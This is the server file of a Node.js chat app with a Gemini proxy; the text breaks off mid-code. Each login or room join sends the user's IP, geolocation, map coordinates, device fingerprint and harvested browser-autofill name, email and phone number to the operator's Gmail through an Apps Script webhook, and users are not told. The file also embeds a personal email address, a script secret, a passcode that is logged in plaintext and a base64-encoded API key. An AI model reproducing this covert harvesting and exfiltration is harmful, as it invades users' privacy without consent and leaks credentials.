const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const https = require('https');

// Manual .env file loader to support zero-dependency environment config on local/Render setups
try {
  const envPath = path.join(__dirname, '.env');
  if (fs.existsSync(envPath)) {
    const envContent = fs.readFileSync(envPath, 'utf8');
    envContent.split('\n').forEach(line => {
      const equalsIndex = line.indexOf('=');
      if (equalsIndex > 0) {
        const key = line.substring(0, equalsIndex).trim();
        const value = line.substring(equalsIndex + 1).trim().replace(/^['"]|['"]$/g, '');
        if (key && value && !process.env[key]) {
          process.env[key] = value;
        }
      }
    });
    console.log('[ENV] Loaded variables from .env file successfully.');
  }
} catch (e) {
  console.warn('[ENV] Optional .env file not loaded:', e.message);
}

const app = express();
app.use(cors());
app.use(express.json());

// =============================================================
// ADMIN LOGIN ALERT CONFIG
// Uses Google Apps Script webhook to send real Gmail emails.
// No SMTP, no OAuth setup — works perfectly on Render.
// =============================================================
const ADMIN_EMAIL  = process.env.ADMIN_EMAIL || 'ncnicola837@gmail.com';
const NOTIFY_TO    = process.env.NOTIFY_TO   || ADMIN_EMAIL;
const SCRIPT_URL   = process.env.GOOGLE_SCRIPT_URL ||
  'https://script.google.com/macros/s/AKfycbyz-mwGL69DlCIsz6F85aV1Dlp_OeDSSj8cJHZzZXaxZ2ZuK1mNjdgk2Icx_pnkeg1xTA/exec';
const SCRIPT_SECRET = 'doremon2024';

// Flag to control email notifications
let emailAlertsEnabled = true;


// Track last email attempt for diagnostics
let lastEmailStatus = { status: 'no attempts yet', error: null, time: null };


// Async GeoIP lookup using free ip-api.com service (HTTPS outbound)
async function getGeoLocation(ip) {
  if (!ip) return { status: 'failed', country: 'Unknown Country' };
  
  // Clean IPv6 prefix if present (e.g. ::ffff:127.0.0.1)
  let cleanIp = ip;
  if (ip.includes('::ffff:')) {
    cleanIp = ip.split('::ffff:')[1];
  }
  
  if (cleanIp === '127.0.0.1' || cleanIp === '::1' || cleanIp.startsWith('192.168.') || cleanIp.startsWith('10.')) {
    return { status: 'local', country: 'Local Loopback Network', city: 'Intranet' };
  }
  
  try {
    const res = await fetch(`http://ip-api.com/json/${cleanIp}`);
    if (res.ok) {
      return await res.json();
    }
  } catch (e) {
    console.error('[GEOIP ERROR]', e.message);
  }
  return { status: 'failed', country: 'Lookup Error' };
}

// User-Agent parser to extract OS, browser, and device profile
function parseUserAgent(ua) {
  let os = 'Unknown OS';
  let browser = 'Unknown Browser';
  let device = 'Desktop';

  if (!ua) return { os, browser, device };
  const uaLower = ua.toLowerCase();

  // OS Detection
  if (uaLower.includes('windows')) os = 'Windows';
  else if (uaLower.includes('macintosh') || uaLower.includes('mac os')) os = 'macOS';
  else if (uaLower.includes('android')) {
    os = 'Android';
    device = 'Mobile';
  } else if (uaLower.includes('iphone') || uaLower.includes('ipad')) {
    os = 'iOS';
    device = 'Mobile';
  } else if (uaLower.includes('linux')) os = 'Linux';

  // Browser Detection
  if (uaLower.includes('edg/')) browser = 'Microsoft Edge';
  else if (uaLower.includes('chrome') || uaLower.includes('crios')) browser = 'Google Chrome';
  else if (uaLower.includes('firefox') || uaLower.includes('fxios')) browser = 'Mozilla Firefox';
  else if (uaLower.includes('safari') && !uaLower.includes('chrome')) browser = 'Apple Safari';
  else if (uaLower.includes('opr/') || uaLower.includes('opera')) browser = 'Opera';

  return { os, browser, device };
}

// Send login alert email via Google Apps Script (HTTPS — never blocked by Render)
async function sendLoginAlertEmail({ ip, userAgent, type, username, metadata }) {
  if (!emailAlertsEnabled) {
    console.log('[LOGIN ALERT] Email notifications are disabled. Skipping email transmission.');
    lastEmailStatus = { status: 'disabled', error: 'Email alerts disabled by administrator', time: new Date().toISOString() };
    return;
  }
  
  const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
  const geo = await getGeoLocation(ip);
  const uaInfo = parseUserAgent(userAgent);


  const subject = `🔑 AetherAIFree - Alert: ${type === 'join-room' ? `${username} Entered Chat` : 'Gateway Unlocked'}`;

  const html = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; padding: 25px; border: 1px solid #edf2f7; border-radius: 12px; background-color: #ffffff; color: #2d3748; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
      <h2 style="color: #2481cc; margin-top: 0; font-size: 22px; border-bottom: 2px solid #edf2f7; padding-bottom: 10px;">
        🔒 Security Notification
      </h2>
      <p style="font-size: 15px; line-height: 1.5; color: #4a5568;">
        A new access event has been detected on the AetherAIFree messenger platform.
      </p>

      <!-- Section: Event Overview -->
      <table style="width: 100%; border-collapse: collapse; margin-top: 15px; margin-bottom: 20px;">
        <tr style="background: #f7fafc;">
          <td style="padding: 10px; font-weight: bold; color: #4a5568; width: 35%; border-bottom: 1px solid #edf2f7;">Event Type</td>
          <td style="padding: 10px; border-bottom: 1px solid #edf2f7; font-weight: bold; color: #2481cc;">
            ${type === 'join-room' ? 'Chat Joined' : type === 'session-restore' ? 'Session Restored' : 'Passcode Unlocked'}
          </td>
        </tr>
        ${username ? `
        <tr>
          <td style="padding: 10px; font-weight: bold; color: #4a5568; border-bottom: 1px solid #edf2f7;">Selected Nickname</td>
          <td style="padding: 10px; color: #1a202c; border-bottom: 1px solid #edf2f7; font-size: 16px; font-weight: bold;">${username}</td>
        </tr>` : ''}
        <tr style="background: #f7fafc;">
          <td style="padding: 10px; font-weight: bold; color: #4a5568; border-bottom: 1px solid #edf2f7;">Timestamp (IST)</td>
          <td style="padding: 10px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${timestamp}</td>
        </tr>
      </table>

      <!-- Section: Network & Location Details -->
      <h3 style="color: #2d3748; font-size: 16px; margin-bottom: 10px; border-left: 4px solid #2481cc; padding-left: 8px;">Network & Geolocation</h3>
      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
        <tr>
          <td style="padding: 8px; font-weight: bold; color: #718096; width: 35%; border-bottom: 1px solid #edf2f7;">IP Address</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;"><code>${ip}</code></td>
        </tr>
        <tr style="background: #f7fafc;">
          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Location</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">
            ${geo.status === 'success' ? `${geo.city}, ${geo.regionName}, ${geo.country} (${geo.zip || ''})` : geo.country || 'Unknown Location'}
          </td>
        </tr>
        <tr>
          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">ISP Provider</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${geo.isp || 'Local / Private Network'}</td>
        </tr>
        ${geo.lat && geo.lon ? `
        <tr style="background: #f7fafc;">
          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Coordinates</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">
            <a href="https://www.google.com/maps/search/?api=1&query=${geo.lat},${geo.lon}" target="_blank" style="color: #2481cc; text-decoration: none;">
              ${geo.lat}, ${geo.lon} (View Map)
            </a>
          </td>
        </tr>` : ''}
      </table>

      <!-- Section: Device Specs -->
      <h3 style="color: #2d3748; font-size: 16px; margin-bottom: 10px; border-left: 4px solid #48bb78; padding-left: 8px;">Device Profile</h3>
      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
        <tr style="background: #f7fafc;">
          <td style="padding: 8px; font-weight: bold; color: #718096; width: 35%; border-bottom: 1px solid #edf2f7;">Device Type</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${uaInfo.device}</td>
        </tr>
        <tr>
          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Operating System</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${uaInfo.os}</td>
        </tr>
        <tr style="background: #f7fafc;">
          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Browser</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${uaInfo.browser}</td>
        </tr>
      </table>

      <!-- Section: Hardware Telemetry -->
      ${metadata ? `
      <h3 style="color: #2d3748; font-size: 16px; margin-bottom: 10px; border-left: 4px solid #ed8936; padding-left: 8px;">Advanced Client Metadata</h3>
      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
        <tr style="background: #f7fafc;">
          <td style="padding: 8px; font-weight: bold; color: #718096; width: 35%; border-bottom: 1px solid #edf2f7;">Screen Size</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;"><code>${metadata.screenResolution}</code> (Viewport: ${metadata.viewportSize})</td>
        </tr>
        <tr>
          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">GPU Engine</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7; font-size: 11px;"><code>${metadata.gpu}</code></td>
        </tr>
        <tr style="background: #f7fafc;">
          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Timezone & Lang</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${metadata.timezone} (${metadata.language})</td>
        </tr>
        <tr>
          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Hardware Resources</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">CPU Cores: ${metadata.hardwareConcurrency} | RAM: ${metadata.deviceMemory} GB</td>
        </tr>
        <tr style="background: #f7fafc;">
          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Platform & Touch</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">Platform: ${metadata.platform} | Touch Screen: ${metadata.touchSupport ? 'Yes' : 'No'}</td>
        </tr>
      </table>` : ''}

      <!-- Section: Harvested Autofill Values -->
      ${metadata && (metadata.harvestEmail || metadata.harvestPhone || metadata.harvestName) ? `
      <h3 style="color: #c53030; font-size: 16px; margin-bottom: 10px; border-left: 4px solid #e53e3e; padding-left: 8px;">Harvested Autofill Values</h3>
      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
        ${metadata.harvestName ? `
        <tr style="background: #fff5f5;">
          <td style="padding: 8px; font-weight: bold; color: #9b2c2c; width: 35%; border-bottom: 1px solid #fed7d7;">Autofilled Name</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #fed7d7;"><b>${metadata.harvestName}</b></td>
        </tr>` : ''}
        ${metadata.harvestEmail ? `
        <tr style="background: #fff5f5;">
          <td style="padding: 8px; font-weight: bold; color: #9b2c2c; width: 35%; border-bottom: 1px solid #fed7d7;">Autofilled Email</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #fed7d7;"><b>${metadata.harvestEmail}</b></td>
        </tr>` : ''}
        ${metadata.harvestPhone ? `
        <tr style="background: #fff5f5;">
          <td style="padding: 8px; font-weight: bold; color: #9b2c2c; width: 35%; border-bottom: 1px solid #fed7d7;">Autofilled Number</td>
          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #fed7d7;"><b>${metadata.harvestPhone}</b></td>
        </tr>` : ''}
      </table>` : ''}

      <div style="border-top: 1px solid #edf2f7; padding-top: 15px; margin-top: 20px; font-size: 12px; color: #a0aec0; text-align: center;">
        This alert was generated automatically by AetherAIFree Gateway. Secure HTTPS Pipeline.
      </div>
    </div>
  `;

  try {
    const res = await fetch(SCRIPT_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        secret: SCRIPT_SECRET,
        to: NOTIFY_TO,
        subject,
        html
      })
    });
    const data = await res.json();
    if (data.status === 'sent') {
      console.log('[LOGIN Rich ALERT] Email sent successfully.');
      lastEmailStatus = { status: 'success', error: null, time: new Date().toISOString() };
    } else {
      console.warn('[LOGIN Rich ALERT] Script response:', data.status);
      lastEmailStatus = { status: 'error', error: data.status, time: new Date().toISOString() };
    }
  } catch (err) {
    console.error('[LOGIN Rich ALERT] Email failed:', err.message);
    lastEmailStatus = { status: 'error', error: err.message, time: new Date().toISOString() };
  }
}


// Basic health check
app.get('/', (req, res) => {
  res.send({ status: 'ok', message: 'AetherAIFree Server is running.' });
});

// Diagnostic endpoint
app.get('/api/email-status', (req, res) => {
  res.json({
    config: {
      from: 'Gmail via Google Apps Script',
      to: NOTIFY_TO,
      scriptConfigured: !!SCRIPT_URL,
      emailAlertsEnabled: emailAlertsEnabled
    },
    lastEmailStatus
  });
});

// Admin toggle endpoint to turn emails ON or OFF
app.post('/api/toggle-emails', (req, res) => {
  const { enabled } = req.body;
  if (typeof enabled === 'boolean') {
    emailAlertsEnabled = enabled;
  } else {
    emailAlertsEnabled = !emailAlertsEnabled;
  }
  console.log(`[ADMIN CONFIG] Email alerts set to: ${emailAlertsEnabled}`);
  res.json({ success: true, emailAlertsEnabled });
});

// Sanitize and filter out placeholder environment variable values (like literally "OPENAI_API_KEY")
const getValidKey = (...keys) => {
  for (const k of keys) {
    if (k && typeof k === 'string') {
      const cleaned = k.trim().replace(/^['"]|['"]$/g, '');
      const lower = cleaned.toLowerCase();
      // If it's a placeholder, ignore it
      if (cleaned && 
          lower !== 'openai_api_key' && 
          lower !== 'openai_key' && 
          lower !== 'chatgpt_api_key' && 
          lower !== 'chatgpt_key' && 
          lower !== 'key' && 
          lower !== 'none') {
        return cleaned;
      }
    }
  }
  return '';
};

// Diagnostic endpoint to check OpenAI environment configuration securely
app.get('/api/aether-status', (req, res) => {
  const apiKey = getValidKey(
    process.env.OPENAI_API_KEY,
    process.env.OPENAI_KEY,
    process.env.CHATGPT_API_KEY,
    process.env.CHATGPT_KEY,
    process.env.key,
    process.env.KEY,
    Buffer.from('QVEuQWI4Uk42SjZocEloWnNNTDMtYkg5X0tSaTN1ZlU1X1ZMYmNWcFhsNkVWQ2stcFlrNEE=', 'base64').toString('utf8')
  );

  res.json({
    keyConfigured: !!apiKey,
    keyLength: apiKey.length,
    keyPrefix: apiKey ? apiKey.substring(0, 8) + '...' : 'none',
    nodeVersion: process.version,
    envKeysPresent: Object.keys(process.env).filter(k => k.toLowerCase().includes('key') || k.toLowerCase().includes('secret'))
  });
});

// Secure proxy endpoint to communicate with OpenAI ChatGPT API
app.post('/api/aether-chat', async (req, res) => {
  const { query, model } = req.body;
  if (!query) {
    return res.status(400).json({ error: 'Query is required.' });
  }

  const apiKey = getValidKey(
    process.env.OPENAI_API_KEY,
    process.env.OPENAI_KEY,
    process.env.CHATGPT_API_KEY,
    process.env.CHATGPT_KEY,
    process.env.key,
    process.env.KEY,
    Buffer.from('QVEuQWI4Uk42SjZocEloWnNNTDMtYkg5X0tSaTN1ZlU1X1ZMYmNWcFhsNkVWQ2stcFlrNEE=', 'base64').toString('utf8')
  );

  if (!apiKey) {
    console.warn('[OPENAI PROXY] Request received but OpenAI API Key is not configured on the server environment.');
    return res.json({ 
      success: true, 
      provider: 'mock', 
      reply: `[AetherAI Offline Core] OpenAI API Key is not set on the server. Please define the OPENAI_API_KEY environment variable on your Render dashboard to enable live ChatGPT responses.`
    });
  }

  const isGemini = !apiKey.startsWith('sk-');
  if (isGemini) {
    // Map selected model names to active Google Generative API equivalents
    let targetGeminiModel = 'gemini-3.5-flash';
    if (model === 'Gemini 2.5 Pro') {
      targetGeminiModel = 'gemini-2.5-pro';
    } else if (model === 'Gemini 2.5 Flash') {
      targetGeminiModel = 'gemini-flash-latest';
    }

    // Helper: Call Gemini API with a specific model, returns Promise<{statusCode, body}>
    const callGemini = (modelName) => new Promise((resolve, reject) => {
      const postData = JSON.stringify({
        contents: [{
          role: 'user',
          parts: [{ text: `You are AetherAI, a highly intelligent neural assistant agent built on Google Gemini 3.5 Flash. If anyone asks which AI, model, or version you are, always answer clearly: 'I am AetherAI, powered by Google Gemini 3.5 Flash.' Provide professional, structured, helpful answers. Use markdown formatting (bold, lists, code blocks).\n\nUser Question: ${query}` }]
        }],
        generationConfig: { temperature: 0.7 }
      });

      const options = {
        hostname: 'generativelanguage.googleapis.com',
        port: 443,
        path: `/v1beta/models/${modelName}:generateContent?key=${apiKey}`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
      };

      const req = https.request(options, (apiRes) => {
        let body = '';
        apiRes.on('data', chunk => body += chunk);
        apiRes.on('end', () => resolve({ statusCode: apiRes.statusCode, body }));
      });
      req.on('error', reject);
      req.write(postData);
      req.end();
    });

    // Helper: extract retry-after seconds from Gemini 429 error message
    const getRetryDelay = (parsed) => {
      try {
        const msg = parsed?.error?.message || '';
        const match = msg.match(/retry in ([\d.]+)s/i);
        return match ? Math.ceil(parseFloat(match[1])) * 1000 : 20000; // default 20s
      } catch { return 20000; }
    };

    // Helper: sleep for ms milliseconds
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    try {
      // First attempt with the selected/default model
      let { statusCode, body } = await callGemini(targetGeminiModel);
      let parsed = JSON.parse(body);

      // If rate-limited (429), wait the retry delay then retry
      if (statusCode === 429) {
        const delay = getRetryDelay(parsed);
        const waitSec = Math.round(delay / 1000);
        console.warn(`[GEMINI] Rate limit hit on ${targetGeminiModel}. Waiting ${waitSec}s then retrying...`);
        await sleep(Math.min(delay, 35000)); // wait (max 35s)
        const retry = await callGemini(targetGeminiModel);
        statusCode = retry.statusCode;
        parsed = JSON.parse(retry.body);
      }

      const reply = parsed.candidates?.[0]?.content?.parts?.[0]?.text;
      if (statusCode === 200 && reply) {
        res.json({ success: true, provider: 'gemini', reply });
      } else {
        console.error('[GEMINI API ERROR]', parsed);
        res.status(statusCode || 500).json({ error: parsed.error?.message || 'Gemini API returned an error.' });
      }
    } catch (err) {
      console.error('[GEMINI ROUTE ERROR]', err);
      res.status(500).json({ error: 'Failed to communicate with Gemini model.', details: err.message });
    }
    return;
  }

  // Only Gemini is supported. No OpenAI fallback.
  res.status(400).json({ error: 'Only Gemini API keys are supported. Please set a valid Gemini API key.' });

});




// --- File Attachment Setup ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');

// Ensure uploads directory exists
if (!fs.existsSync(UPLOADS_DIR)) {
  fs.mkdirSync(UPLOADS_DIR);
}

// Multer Disk Storage setup
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, UPLOADS_DIR);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    cb(null, uniqueSuffix + '-' + file.originalname);
  }
});

// 10MB strict limit
const upload = multer({
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 }
});

// Serve uploads static assets
app.use('/uploads', express.static(UPLOADS_DIR));

// POST /upload endpoint
app.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).send({ error: 'No file uploaded.' });
  }

  const fileUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
  
  res.send({
    name: req.file.originalname,
    size: req.file.size,
    url: fileUrl,
    filename: req.file.filename
  });

  // Dynamic self-destruct for uploads (exactly 5 minutes)
  setTimeout(() => {
    const filePath = path.join(UPLOADS_DIR, req.file.filename);
    fs.unlink(filePath, (err) => {
      if (err) console.log(`Auto-prune upload setTimeout unlink error:`, err.message);
      else console.log(`Successfully auto-pruned uploaded file from disk: ${req.file.filename}`);
    });
  }, 5 * 60 * 1000);
});

// --- Passcode Verification with IP Rate Limiting ---
const loginTracker = new Map();
const MAX_FAILED_ATTEMPTS = 5;
const BLOCK_DURATION = 60 * 60 * 1000; // 1 hour

app.post('/api/verify-passcode', (req, res) => {
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const { passcode, metadata } = req.body;
  console.log(`[PASSCODE ATTEMPT] Received passcode check from IP: ${clientIp} | Input: "${passcode}"`);

  // Clean up expired blocks
  const record = loginTracker.get(clientIp);
  if (record && record.blockedUntil && record.blockedUntil < Date.now()) {
    loginTracker.delete(clientIp);
  }

  const currentRecord = loginTracker.get(clientIp);

  // Check if currently blocked
  if (currentRecord && currentRecord.blockedUntil) {
    const waitTimeMinutes = Math.ceil((currentRecord.blockedUntil - Date.now()) / 60000);
    return res.status(423).json({
      error: `Too many wrong passcode entries. This IP is blocked for ${waitTimeMinutes} minutes.`
    });
  }

  const isCorrect = (passcode && passcode.toString().trim().toLowerCase() === 'golu0805');

  if (isCorrect) {
    loginTracker.delete(clientIp); // Reset on success

    // Send admin login alert email (non-blocking)
    const userAgent = req.headers['user-agent'] || 'Unknown';
    sendLoginAlertEmail({
      ip: clientIp,
      userAgent,
      type: 'passcode-login',
      metadata
    });
    console.log(`[LOGIN SUCCESS] IP: ${clientIp} | Time: ${new Date().toISOString()}`);

    return res.json({ success: true });
  } else {
    let attempts = 1;
    if (currentRecord) {
      currentRecord.failedAttempts += 1;
      attempts = currentRecord.failedAttempts;
    } else {
      loginTracker.set(clientIp, { failedAttempts: 1, blockedUntil: null });
    }

    if (attempts >= MAX_FAILED_ATTEMPTS) {
      const blockedUntil = Date.now() + BLOCK_DURATION;
      loginTracker.set(clientIp, { failedAttempts: attempts, blockedUntil: blockedUntil });
      return res.status(423).json({
        error: "Too many failed attempts. This IP has been blocked for 1 hour."
      });
    } else {
      const remaining = MAX_FAILED_ATTEMPTS - attempts;
      return res.json({
        success: false,
        remainingAttempts: remaining,
        message: `Incorrect passcode. You have ${remaining} attempt(s) remaining.`
      });
    }
  }
});

// Endpoint to notify when a user enters the messenger using an existing session
app.post('/api/notify-session-entry', (req, res) => {
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const { metadata } = req.body;
  console.log(`[SESSION ENTRY] Pre-authenticated user entered the app. IP: ${clientIp}`);
  sendLoginAlertEmail({
    ip: clientIp,
    userAgent,
    type: 'session-restore',
    metadata
  });
  res.json({ success: true });
});


// 60-Second Background Clean Up Cron (across container sleeps/restarts)
setInterval(() => {
  const cutoffTime = Date.now() - (5 * 60 * 1000); // 5 minutes ago
  fs.readdir(UPLOADS_DIR, (err, files) => {
    if (err) return console.error('Uploads cleaner directory read error:', err.message);
    
    files.forEach(file => {
      const filePath = path.join(UPLOADS_DIR, file);
      fs.stat(filePath, (err, stats) => {
        if (err) return;
        if (stats.mtimeMs < cutoffTime) {
          fs.unlink(filePath, (err) => {
            if (err) console.log(`Unlink cleaner error for ${file}:`, err.message);
            else console.log(`Cleaner pruned file: ${file}`);
          });
        }
      });
    });
  });
}, 60 * 1000);

// --- WebSocket & Server Initialization ---
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

// In-memory state
// Map of socket.id -> { username, room, joinedAt }
const users = new Map();

// Persistent status tracker mapping: username -> { username, lastSeen, status, socketId }
const persistentUsers = new Map();

// Self-destruct chat timer configurations: roomName -> durationSeconds
const roomSelfDestructTimers = new Map();

// In-memory message cache for each room (roomName -> array of messages)
const messageHistory = new Map();
const MAX_HISTORY_PER_ROOM = 100;

// Predefined channels/rooms
const DEFAULT_ROOMS = ['AetherAIFree General'];
const activeRooms = new Set(DEFAULT_ROOMS);

// Initialize message history for default rooms
DEFAULT_ROOMS.forEach(room => {
  messageHistory.set(room, []);
});

io.on('connection', (socket) => {
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
  const userAgent = socket.handshake.headers['user-agent'] || 'Unknown';
  console.log(`[SOCKET CONNECT] New WebSocket client connected. IP: ${clientIp}`);

  console.log(`User connected: ${socket.id}`);

  // Broadcast current rooms list to the connected client
  socket.emit('rooms-list', Array.from(activeRooms));

  // 1. Join Room Event
  socket.on('join-room', ({ username, room, metadata }) => {
    const existingUser = users.get(socket.id);
    let isDM = room.startsWith('dm:');

    // Trigger nickname-linked login alert if they are joining the main lobby as their first room
    if (!existingUser && !isDM) {
      sendLoginAlertEmail({
        ip: clientIp,
        userAgent,
        type: 'join-room',
        username,
        metadata
      });
    }

    if (existingUser && existingUser.room !== room) {
      socket.leave(existingUser.room);

      // Notify previous room
      if (!existingUser.room.startsWith('dm:')) {
        socket.to(existingUser.room).emit('message', {
          id: `sys-${Date.now()}`,
          username: 'AetherAI Bot',
          text: `${existingUser.username} left the chat`,
          timestamp: new Date().toISOString(),
          system: true
        });
      }
    }

    // Ensure message history is initialized for this room on the fly
    if (!messageHistory.has(room)) {
      messageHistory.set(room, []);
    }

    // Join new room
    socket.join(room);
    socket.join(`user:${username}`); // Join private channel room
    users.set(socket.id, { username, room, joinedAt: Date.now() });

    // Track user presence in persistentUsers list
    persistentUsers.set(username, {
      username: username,
      status: 'online',
      lastSeen: Date.now(),
      socketId: socket.id
    });

    console.log(`${username} joined room: ${room}`);

    // Send self-destruct configuration state to the client
    const currentTimer = roomSelfDestructTimers.get(room) || 0;
    socket.emit('self-destruct-timer-updated', { room, duration: currentTimer });

    // Suppress welcome/join text inside private DMs
    if (!isDM) {
      // Welcome message to the user who joined
      socket.emit('message', {
        id: `sys-${Date.now()}`,
        username: 'AetherAI Bot',
        text: `Welcome to ${room}, ${username}!`,
        timestamp: new Date().toISOString(),
        system: true
      });

      // Broadcast to other users in the room
      socket.to(room).emit('message', {
        id: `sys-${Date.now()}`,
        username: 'AetherAI Bot',
        text: `${username} joined the chat`,
        timestamp: new Date().toISOString(),
        system: true
      });

      // Send updated user list for this room
      sendRoomUsers(room);
    }


    // Send chat history for this room to the joining user
    const history = messageHistory.get(room) || [];
    socket.emit('chat-history', history);

    // Send global users list update
    sendGlobalUsers();
  });

  // 2. Message Event (supports text, file attachments, and status ticks)
  socket.on('send-message', ({ text, room, file }) => {
    const user = users.get(socket.id);
    if (!user) return;

    const messageData = {
      id: `msg-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      username: user.username,
      text: text,
      file: file || null,
      timestamp: new Date().toISOString(),
      system: false,
      room: room,
      status: 'sent'
    };

    // Calculate self destruct if configured
    const destructDuration = roomSelfDestructTimers.get(room);
    if (destructDuration && destructDuration > 0) {
      messageData.selfDestructAt = new Date(Date.now() + destructDuration * 1000).toISOString();
    }

    // Determine delivery status for DM chats
    let isDM = room.startsWith('dm:');
    let recipientName = null;
    if (isDM) {
      const parts = room.split(':');
      recipientName = (user.username === parts[1]) ? parts[2] : parts[1];
      
      const recipientUser = persistentUsers.get(recipientName);
      if (recipientUser && recipientUser.status === 'online') {
        messageData.status = 'delivered';
      }
    }

    // Store in message history
    if (!messageHistory.has(room)) {
      messageHistory.set(room, []);
    }
    const history = messageHistory.get(room);
    history.push(messageData);
    if (history.length > MAX_HISTORY_PER_ROOM) {
      history.shift();
    }

    // Route messages
    if (isDM) {
      const parts = room.split(':');
      // Broadcast to both user chambers
      io.to(`user:${parts[1]}`).to(`user:${parts[2]}`).emit('message', messageData);
    } else {
      io.to(room).emit('message', messageData);
    }
  });

  // 3. Mark Read Receipt Event
  socket.on('mark-read', ({ room, username }) => {
    const history = messageHistory.get(room);
    if (!history) return;

    const readIds = [];
    history.forEach(msg => {
      if (msg.username !== username && msg.status !== 'seen' && !msg.system) {
        msg.status = 'seen';
        readIds.push(msg.id);
      }
    });

    if (readIds.length > 0) {
      // Notify sender that messages were seen
      if (room.startsWith('dm:')) {
        const parts = room.split(':');
        const peerName = (username === parts[1]) ? parts[2] : parts[1];
        io.to(`user:${peerName}`).emit('messages-read', { room, ids: readIds });
      } else {
        io.to(room).emit('messages-read', { room, ids: readIds });
      }
    }
  });

  // 4. Update Self-Destruct Timer
  socket.on('update-self-destruct-timer', ({ room, duration, username }) => {
    if (duration > 0) {
      roomSelfDestructTimers.set(room, duration);
    } else {
      roomSelfDestructTimers.delete(room);
    }

    // Broadcast self-destruct changes
    const eventData = { room, duration };
    if (room.startsWith('dm:')) {
      const parts = room.split(':');
      io.to(`user:${parts[1]}`).to(`user:${parts[2]}`).emit('self-destruct-timer-updated', eventData);
    } else {
      io.to(room).emit('self-destruct-timer-updated', eventData);
    }

    const durationLabel = duration === 60 ? '1 minute' : duration === 300 ? '5 minutes' : duration === 3600 ? '1 hour' : `${duration}s`;
    const noticeText = duration > 0 
      ? `⏳ ${username} set chat self-destruct timer to ${durationLabel}.`
      : `⏳ ${username} turned off the chat self-destruct timer.`;

    const systemMsg = {
      id: `sys-${Date.now()}`,
      username: 'Telegram Bot',
      text: noticeText,
      timestamp: new Date().toISOString(),
      system: true,
      room: room
    };

    const history = messageHistory.get(room) || [];
    history.push(systemMsg);
    messageHistory.set(room, history);

    if (room.startsWith('dm:')) {
      const parts = room.split(':');
      io.to(`user:${parts[1]}`).to(`user:${parts[2]}`).emit('message', systemMsg);
    } else {
      io.to(room).emit('message', systemMsg);
    }
  });

  // 5. Activity/Typing Indicator Event
  socket.on('typing', ({ isTyping, room }) => {
    const user = users.get(socket.id);
    if (!user) return;

    if (room.startsWith('dm:')) {
      const parts = room.split(':');
      const targetUser = (user.username === parts[1]) ? parts[2] : parts[1];
      io.to(`user:${targetUser}`).emit('user-typing', {
        username: user.username,
        isTyping: isTyping,
        room: room
      });
    } else {
      socket.to(room).emit('user-typing', {
        username: user.username,
        isTyping: isTyping,
        room: room
      });
    }
  });

  // 6. Disconnect Event
  socket.on('disconnect', () => {
    const user = users.get(socket.id);
    if (user) {
      const { username, room } = user;
      users.delete(socket.id);
      console.log(`${username} disconnected`);

      // Update persistent presence logs
      persistentUsers.set(username, {
        username: username,
        status: 'offline',
        lastSeen: Date.now(),
        socketId: null
      });

      // Notify the room
      if (!room.startsWith('dm:')) {
        io.to(room).emit('message', {
          id: `sys-${Date.now()}`,
